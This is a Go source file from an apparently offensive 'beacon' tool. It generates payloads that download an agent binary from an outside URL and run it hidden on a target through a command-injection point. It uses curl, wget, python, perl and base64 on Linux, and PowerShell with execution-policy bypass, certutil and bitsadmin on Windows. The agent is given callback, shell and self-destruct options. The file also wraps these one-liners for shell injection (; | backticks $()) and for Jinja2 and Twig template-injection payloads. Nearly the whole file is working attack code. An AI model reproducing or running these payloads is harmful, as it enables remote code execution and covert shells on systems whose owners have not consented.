package agent

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
)

// DropMethod describes how to deliver the agent to a target.
type DropMethod struct {
	Name        string // human-readable name
	Platform    string // linux, darwin, windows, any
	Requires    string // what the injection point must support
	Commands    []string // shell commands to execute through the injection point
}

// truncToken returns the first n characters of s, or all of s if shorter.
func truncToken(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

// GenerateToken creates a random token for agent identification.
func GenerateToken() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// DropCommands generates shell commands to download and execute the agent
// through a confirmed injection point. The agentURL is where the agent
// binary is hosted (beacon's HTTP server or external URL).
func DropCommands(agentURL, callbackAddr, token string, ttlMinutes int, targetOS string) []DropMethod {
	if targetOS == "" {
		targetOS = runtime.GOOS
	}

	var methods []DropMethod

	switch targetOS {
	case "linux", "darwin":
		methods = append(methods, unixDropMethods(agentURL, callbackAddr, token, ttlMinutes)...)
	case "windows":
		methods = append(methods, windowsDropMethods(agentURL, callbackAddr, token, ttlMinutes)...)
	}

	return methods
}

func unixDropMethods(agentURL, callbackAddr, token string, ttlMinutes int) []DropMethod {
	agentPath := "/tmp/.beacon-" + truncToken(token, 8)
	args := fmt.Sprintf("--callback %s --token %s --ttl %dm --evidence --shell --self-destruct",
		callbackAddr, token, ttlMinutes)

	return []DropMethod{
		{
			Name:     "curl + exec",
			Platform: "linux",
			Requires: "curl, write to /tmp",
			Commands: []string{
				fmt.Sprintf("curl -sk -o %s %s", agentPath, agentURL),
				fmt.Sprintf("chmod +x %s", agentPath),
				fmt.Sprintf("nohup %s %s &>/dev/null &", agentPath, args),
			},
		},
		{
			Name:     "wget + exec",
			Platform: "linux",
			Requires: "wget, write to /tmp",
			Commands: []string{
				fmt.Sprintf("wget -q --no-check-certificate -O %s %s", agentPath, agentURL),
				fmt.Sprintf("chmod +x %s", agentPath),
				fmt.Sprintf("nohup %s %s &>/dev/null &", agentPath, args),
			},
		},
		{
			Name:     "python download + exec",
			Platform: "linux",
			Requires: "python3, write to /tmp",
			Commands: []string{
				fmt.Sprintf(`python3 -c "import urllib.request; urllib.request.urlretrieve('%s','%s')"`,
					agentURL, agentPath),
				fmt.Sprintf("chmod +x %s", agentPath),
				fmt.Sprintf("nohup %s %s &>/dev/null &", agentPath, args),
			},
		},
		{
			Name:     "perl download + exec",
			Platform: "linux",
			Requires: "perl, write to /tmp",
			Commands: []string{
				fmt.Sprintf(`perl -e 'use LWP::Simple; getstore("%s","%s")'`,
					agentURL, agentPath),
				fmt.Sprintf("chmod +x %s", agentPath),
				fmt.Sprintf("nohup %s %s &>/dev/null &", agentPath, args),
			},
		},
		{
			Name:     "base64 pipe (no download)",
			Platform: "linux",
			Requires: "base64, write to /tmp",
			Commands: []string{
				"# Agent binary must be base64-encoded and piped via injection",
				fmt.Sprintf("echo '<BASE64_AGENT>' | base64 -d > %s", agentPath),
				fmt.Sprintf("chmod +x %s", agentPath),
				fmt.Sprintf("nohup %s %s &>/dev/null &", agentPath, args),
			},
		},
	}
}

func windowsDropMethods(agentURL, callbackAddr, token string, ttlMinutes int) []DropMethod {
	agentPath := fmt.Sprintf(`%%TEMP%%\beacon-%s.exe`, truncToken(token, 8))
	args := fmt.Sprintf("--callback %s --token %s --ttl %dm --evidence --shell --self-destruct",
		callbackAddr, token, ttlMinutes)

	return []DropMethod{
		{
			Name:     "PowerShell download + exec",
			Platform: "windows",
			Requires: "PowerShell",
			Commands: []string{
				fmt.Sprintf(`powershell -ep bypass -c "Invoke-WebRequest -Uri '%s' -OutFile '%s'; Start-Process '%s' -ArgumentList '%s' -WindowStyle Hidden"`,
					agentURL, agentPath, agentPath, args),
			},
		},
		{
			Name:     "certutil download + exec",
			Platform: "windows",
			Requires: "certutil.exe",
			Commands: []string{
				fmt.Sprintf(`certutil -urlcache -split -f %s %s`, agentURL, agentPath),
				fmt.Sprintf(`start /b %s %s`, agentPath, args),
			},
		},
		{
			Name:     "bitsadmin download + exec",
			Platform: "windows",
			Requires: "bitsadmin.exe",
			Commands: []string{
				fmt.Sprintf(`bitsadmin /transfer beacon /download /priority high %s %s`, agentURL, agentPath),
				fmt.Sprintf(`start /b %s %s`, agentPath, args),
			},
		},
	}
}

// OneLiners generates single-command payloads for injection points that
// only allow a single command (e.g., command injection via ; or |).
func OneLiners(agentURL, callbackAddr, token string, ttlMinutes int) map[string]string {
	agentPath := "/tmp/.b-" + truncToken(token, 8)
	args := fmt.Sprintf("--callback %s --token %s --ttl %dm --evidence --shell --self-destruct",
		callbackAddr, token, ttlMinutes)

	return map[string]string{
		"curl": fmt.Sprintf(
			"curl -sk -o %s %s && chmod +x %s && nohup %s %s &>/dev/null &",
			agentPath, agentURL, agentPath, agentPath, args),
		"wget": fmt.Sprintf(
			"wget -q --no-check-certificate -O %s %s && chmod +x %s && nohup %s %s &>/dev/null &",
			agentPath, agentURL, agentPath, agentPath, args),
		"python": fmt.Sprintf(
			`python3 -c "import urllib.request,os,subprocess;urllib.request.urlretrieve('%s','%s');os.chmod('%s',0o755);subprocess.Popen(['%s']+%q.split())"`,
			agentURL, agentPath, agentPath, agentPath, args),
	}
}

// InjectPayload wraps a one-liner for a specific injection vector.
func InjectPayload(oneLiner, vector string) string {
	switch vector {
	case "cmdinj_semicolon":
		return "; " + oneLiner + " #"
	case "cmdinj_pipe":
		return "| " + oneLiner + " #"
	case "cmdinj_backtick":
		return "`" + oneLiner + "`"
	case "cmdinj_dollar":
		return "$(" + oneLiner + ")"
	case "ssti_jinja2":
		return fmt.Sprintf(`{{''.__class__.__mro__[1].__subclasses__()[408]('%s',shell=True)}}`,
			strings.ReplaceAll(oneLiner, "'", "\\'"))
	case "ssti_twig":
		return fmt.Sprintf(`{{['%s']|filter('system')}}`,
			strings.ReplaceAll(oneLiner, "'", "\\'"))
	default:
		return oneLiner
	}
}
